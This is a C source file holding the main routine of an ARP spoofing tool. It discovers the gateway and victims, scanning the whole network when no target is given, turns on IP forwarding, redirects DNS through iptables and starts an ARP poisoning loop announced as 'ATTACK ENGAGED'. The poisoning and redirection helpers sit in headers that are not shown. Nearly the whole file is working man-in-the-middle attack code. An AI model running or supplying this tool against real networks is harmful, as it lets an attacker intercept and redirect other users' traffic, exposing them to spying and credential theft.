#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <getopt.h>
#include <arpa/inet.h>

#include "ARP/ARP_UTILS/utils_discovery.h"
#include "ARP/ARP_UTILS/arp_scan.h"
#include "ARP/ARP_UTILS/arp_poison.h"
#include "ARP/ARP_UTILS/utils_iptables.h"

int g_victim_count = 0;
struct Victim *g_victims = NULL;
unsigned char g_gateway_ip[4];
unsigned char g_gateway_mac[6];
unsigned char *g_mac_alloc = NULL;

void handle_sigint(int sig) {
    (void)sig; // suppress unused warning
    printf("\n[SHUTDOWN] Caught SIGINT. Commencing graceful shutdown...\n");
    
    // De-poison the network cleanly
    if (g_victims && g_victim_count > 0) {
        heal_arp(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac);
        free(g_victims);
    }
    
    // Revert iptables rules
    cleanup_dns_redirect();

    if (g_mac_alloc) free(g_mac_alloc);
    exit(EXIT_SUCCESS);
}

void print_hex_mac(unsigned char* mac) {
    for (int i = 0; i < 6; ++i)
        printf("%02x%c", mac[i], i == 5 ? '\n' : ':');
}

int main(int argc, char *argv[]) {
    char *victim_ip_str = NULL;
    char *gateway_ip_str = NULL;
    int opt;

    while ((opt = getopt(argc, argv, "t:g:h")) != -1) {
        switch (opt) {
            case 't': victim_ip_str = optarg; break;
            case 'g': gateway_ip_str = optarg; break;
            case 'h':
            default:
                fprintf(stderr, "Usage: %s [-t <victim_ip>] [-g <gateway_ip>]\n", argv[0]);
                fprintf(stderr, "If -t is omitted, scans network for all victims.\n");
                fprintf(stderr, "If -g is omitted, auto-discovers default gateway.\n");
                exit(EXIT_FAILURE);
        }
    }

    printf("[*] Starting ARP Spoofer Engine...\n");

    // 1. Resolve Gateway IP
    if (gateway_ip_str) {
        struct in_addr jw_addr;
        if (inet_pton(AF_INET, gateway_ip_str, &jw_addr) != 1) {
            fprintf(stderr, "Invalid Gateway IP format.\n");
            exit(EXIT_FAILURE);
        }
        memcpy(g_gateway_ip, &jw_addr.s_addr, 4);
        printf("[*] Using provided Gateway IP: %d.%d.%d.%d\n", g_gateway_ip[0], g_gateway_ip[1], g_gateway_ip[2], g_gateway_ip[3]);
    } else {
        printf("[*] Discovering default gateway...\n");
        unsigned char *gw_ip_alloc = get_default_gateway_ip();
        if (!gw_ip_alloc) {
            fprintf(stderr, "[!] Failed to discover default gateway.\n");
            exit(EXIT_FAILURE);
        }
        memcpy(g_gateway_ip, gw_ip_alloc, 4);
        free(gw_ip_alloc);
        printf("[+] Discovered Gateway IP: %d.%d.%d.%d\n", g_gateway_ip[0], g_gateway_ip[1], g_gateway_ip[2], g_gateway_ip[3]);
    }

    // 2. Resolve Gateway MAC
    g_mac_alloc = get_mac_from_ip(g_gateway_ip);
    if (!g_mac_alloc) {
        fprintf(stderr, "[!] Failed to resolve Gateway MAC over eth0.\n");
        exit(EXIT_FAILURE);
    }
    memcpy(g_gateway_mac, g_mac_alloc, 6);
    printf("[*] Discovered Gateway MAC:  "); print_hex_mac(g_gateway_mac);

    // 3. Resolve Victims
    if (victim_ip_str) {
        printf("[*] Using single targeted victim...\n");
        struct in_addr vic_addr;
        if (inet_pton(AF_INET, victim_ip_str, &vic_addr) != 1) {
            fprintf(stderr, "Invalid Target (Victim) IP format.\n");
            exit(EXIT_FAILURE);
        }
        
        g_victims = malloc(sizeof(struct Victim));
        if (!g_victims) {
            fprintf(stderr, "[!] Failed to allocate memory for victim.\n");
            exit(EXIT_FAILURE);
        }
        
        memcpy(g_victims[0].ip, &vic_addr.s_addr, 4);
        unsigned char *v_mac_alloc = get_mac_from_ip(g_victims[0].ip);
        if (!v_mac_alloc) {
            fprintf(stderr, "[!] Failed to resolve Victim MAC for %s over eth0.\n", victim_ip_str);
            free(g_victims);
            exit(EXIT_FAILURE);
        }
        memcpy(g_victims[0].mac, v_mac_alloc, 6);
        free(v_mac_alloc);
        
        g_victim_count = 1;
        printf("[*] Discovered Victim MAC:   "); print_hex_mac(g_victims[0].mac);
    } else {
        printf("[*] Discovering network victims...\n");
        g_victims = scan_network(g_gateway_ip, &g_victim_count);
        if (!g_victims || g_victim_count == 0 || g_victim_count > 512) {
            fprintf(stderr, "[!] Failed to scan network or no victims found.\n");
            // Memory handled gracefully inside scan_network if empty
            if (g_mac_alloc) free(g_mac_alloc);
            exit(EXIT_FAILURE);
        }
        printf("[+] Found %d victims on the network.\n", g_victim_count);
    }

    // Setup Packet Forwarding and IPTables
    printf("[*] Configuring internal packet routing...\n");
    enable_ip_forwarding();

    printf("[*] Integrating with Technitium DNS...\n");
    setup_dns_redirect();

    // Register Signal handler for graceful shutdown
    signal(SIGINT, handle_sigint);

    // Launch Loop
    printf("\n[*] >>> ATTACK ENGAGED : ARP poisoning Engine active! <<<\n");
    printf("[*] (Press Ctrl+C to cleanly heal the network and exit)\n\n");
    start_poisoning(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac);

    // Only reached if start_poisoning exits
    cleanup_dns_redirect();
    if (g_victims) free(g_victims);
    if (g_mac_alloc) free(g_mac_alloc);
    
    return EXIT_SUCCESS;
}
